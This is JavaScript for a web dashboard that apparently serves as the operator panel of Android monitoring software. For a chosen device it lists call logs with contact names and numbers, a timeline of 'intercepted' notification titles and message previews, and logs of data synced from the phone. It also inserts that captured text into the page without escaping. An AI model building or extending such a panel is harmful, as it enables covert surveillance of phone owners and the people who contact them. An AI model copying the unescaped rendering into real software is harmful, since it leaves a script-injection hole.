// User Details Inspector Logic
document.addEventListener('DOMContentLoaded', () => {
    // Parse URL params
    const urlParams = new URLSearchParams(window.location.search);
    const uid = urlParams.get('uid');
    const deviceId = urlParams.get('device');

    if (!uid || !deviceId) {
        alert("Device specifications parameter missing.");
        window.location.href = 'users.html';
        return;
    }

    // Tab Switching Logic
    const tabBtns = document.querySelectorAll('.tab-btn');
    const tabPanes = document.querySelectorAll('.tab-pane');

    tabBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            const targetTab = btn.getAttribute('data-tab');
            
            tabBtns.forEach(b => b.classList.remove('active'));
            tabPanes.forEach(p => p.classList.remove('active'));
            
            btn.classList.add('active');
            document.getElementById(targetTab).classList.add('active');
            
            // Trigger specific lazy loaders if needed
            if (targetTab === 'tab-analytics') {
                loadAnalyticsCharts(uid, deviceId);
            }
        });
    });

    // Initial Loaders
    loadProfile(uid);
    loadDeviceInfo(uid, deviceId);
    loadCallLogs(uid, deviceId);
    loadNotifications(uid, deviceId);
    loadSyncLogs(uid, deviceId);

    // 1. Profile Panel
    function loadProfile(userId) {
        db.ref('users').child(userId).once('value')
            .then(snapshot => {
                const user = snapshot.val() || {};
                document.getElementById('profEmail').textContent = user.email || 'N/A';
                document.getElementById('profUid').textContent = userId;
                document.getElementById('profRegTime').textContent = user.registeredAt 
                    ? new Date(user.registeredAt).toLocaleString() 
                    : 'N/A';
            });
    }

    // 2. Device Panel
    function loadDeviceInfo(userId, devId) {
        db.ref('devices').child(userId).child(devId).once('value')
            .then(snapshot => {
                const dev = snapshot.val() || {};
                document.getElementById('devManufacturer').textContent = dev.manufacturer || 'N/A';
                document.getElementById('devModel').textContent = dev.model || 'N/A';
                document.getElementById('devId').textContent = dev.deviceId || 'N/A';
                document.getElementById('devAndroid').textContent = dev.androidVersion || 'N/A';
                document.getElementById('devAppVer').textContent = dev.appVersion || 'N/A';
                document.getElementById('devRegTime').textContent = dev.registeredAt 
                    ? new Date(dev.registeredAt).toLocaleString() 
                    : 'N/A';
                
                const lastActive = dev.lastActive ? new Date(dev.lastActive).toLocaleString() : 'Never';
                const isOnline = dev.lastActive && (Date.now() - dev.lastActive < 10 * 60 * 1000);
                const statusBadge = isOnline 
                    ? `<span class="badge badge-success">ONLINE</span>` 
                    : `<span class="badge badge-warning">OFFLINE</span>`;
                
                document.getElementById('devLastActive').innerHTML = `${lastActive} ${statusBadge}`;
            });
    }

    // 3. Call Logs Panel (With Filters)
    let allCalls = [];
    function loadCallLogs(userId, devId) {
        const callsBody = document.getElementById('callsBody');
        callsBody.innerHTML = `<tr><td colspan="4" class="loading-indicator">Loading Call records...</td></tr>`;

        db.ref('call_logs').child(userId).child(devId).once('value')
            .then(snapshot => {
                allCalls = [];
                snapshot.forEach(child => {
                    allCalls.push(child.val());
                });

                // Sort calls by timestamp descending
                allCalls.sort((a, b) => b.timestamp - a.timestamp);
                
                renderCallLogs(allCalls);
                setupCallFilters();
            });
    }

    function renderCallLogs(logs) {
        const callsBody = document.getElementById('callsBody');
        if (logs.length === 0) {
            callsBody.innerHTML = `<tr><td colspan="4" class="loading-indicator">No call records found.</td></tr>`;
            return;
        }

        let html = '';
        logs.forEach(call => {
            const time = new Date(call.timestamp).toLocaleString();
            const duration = call.duration === 0 ? 'No duration' : `${call.duration}s`;
            let badgeClass = 'badge-success';
            if (call.type === 'OUTGOING') badgeClass = 'badge-warning';
            if (call.type === 'MISSED') badgeClass = 'badge-danger';
            
            let displayName = call.number;
            if (call.contactName && call.contactName !== 'Unknown') {
                displayName = `${call.contactName} (${call.number})`;
            }

            html += `
                <tr>
                    <td><span class="badge ${badgeClass}">${call.type}</span></td>
                    <td><strong>${displayName}</strong></td>
                    <td>${duration}</td>
                    <td>${time}</td>
                </tr>
            `;
        });
        callsBody.innerHTML = html;
    }

    function setupCallFilters() {
        const filterType = document.getElementById('filterCallType');
        const filterSearch = document.getElementById('searchCallNumber');

        if (filterType && filterSearch) {
            const applyFilters = () => {
                const typeVal = filterType.value;
                const searchVal = filterSearch.value.trim().toLowerCase();

                let filtered = allCalls.filter(call => {
                    const matchesType = (typeVal === 'ALL' || call.type === typeVal);
                    const matchesSearch = call.number.toLowerCase().includes(searchVal) || 
                                          (call.contactName && call.contactName.toLowerCase().includes(searchVal));
                    return matchesType && matchesSearch;
                });
                renderCallLogs(filtered);
            };

            filterType.addEventListener('change', applyFilters);
            filterSearch.addEventListener('input', applyFilters);
        }
    }

    // 4. Notifications Panel
    function loadNotifications(userId, devId) {
        const notifTimeline = document.getElementById('notifTimeline');
        notifTimeline.innerHTML = `<div class="loading-indicator">Loading Notification Timeline...</div>`;

        db.ref('notification_logs').child(userId).child(devId).once('value')
            .then(snapshot => {
                let list = [];
                snapshot.forEach(child => {
                    list.push(child.val());
                });

                // Sort by timestamp desc
                list.sort((a, b) => b.timestamp - a.timestamp);

                if (list.length === 0) {
                    notifTimeline.innerHTML = `<div class="loading-indicator">No notifications intercepted.</div>`;
                    return;
                }

                let html = '';
                list.forEach(notif => {
                    const time = new Date(notif.timestamp).toLocaleString();
                    html += `
                        <div class="timeline-bubble">
                            <div class="timeline-header">
                                <span class="timeline-appname">${notif.appName}</span>
                                <span>${time}</span>
                            </div>
                            <div class="timeline-title">${notif.title}</div>
                            <div class="timeline-message">${notif.messagePreview}</div>
                            <div style="font-size:10sp; color:var(--text-secondary); margin-top:2px;"><code>${notif.packageName}</code></div>
                        </div>
                    `;
                });
                notifTimeline.innerHTML = `<div class="timeline-stream">${html}</div>`;
            });
    }

    // 5. Sync History Logs
    function loadSyncLogs(userId, devId) {
        const syncLogsBody = document.getElementById('syncLogsBody');
        syncLogsBody.innerHTML = `<tr><td colspan="3" class="loading-indicator">Loading Sync records...</td></tr>`;

        db.ref('sync_logs').child(userId).child(devId).once('value')
            .then(snapshot => {
                let list = [];
                snapshot.forEach(child => {
                    list.push(child.val());
                });

                list.sort((a, b) => b.timestamp - a.timestamp);

                if (list.length === 0) {
                    syncLogsBody.innerHTML = `<tr><td colspan="3" class="loading-indicator">No data transfers tracked.</td></tr>`;
                    document.getElementById('heartbeatLogsBody').innerHTML = `<tr><td colspan="3" class="loading-indicator">No periodic checks tracked.</td></tr>`;
                    return;
                }

                let htmlSync = '';
                let htmlHeartbeat = '';
                
                list.forEach(log => {
                    const time = new Date(log.timestamp).toLocaleString();
                    const badgeClass = log.status === 'SUCCESS' ? 'badge-success' : 'badge-danger';
                    const row = `
                        <tr>
                            <td>${time}</td>
                            <td><span class="badge ${badgeClass}">${log.status}</span></td>
                            <td>${log.itemsSynced} packets</td>
                        </tr>
                    `;
                    
                    if (log.itemsSynced > 0) {
                        htmlSync += row;
                    } else {
                        htmlHeartbeat += row;
                    }
                });
                
                syncLogsBody.innerHTML = htmlSync || `<tr><td colspan="3" class="loading-indicator">No data transfers tracked.</td></tr>`;
                document.getElementById('heartbeatLogsBody').innerHTML = htmlHeartbeat || `<tr><td colspan="3" class="loading-indicator">No periodic checks tracked.</td></tr>`;
            });
    }
});
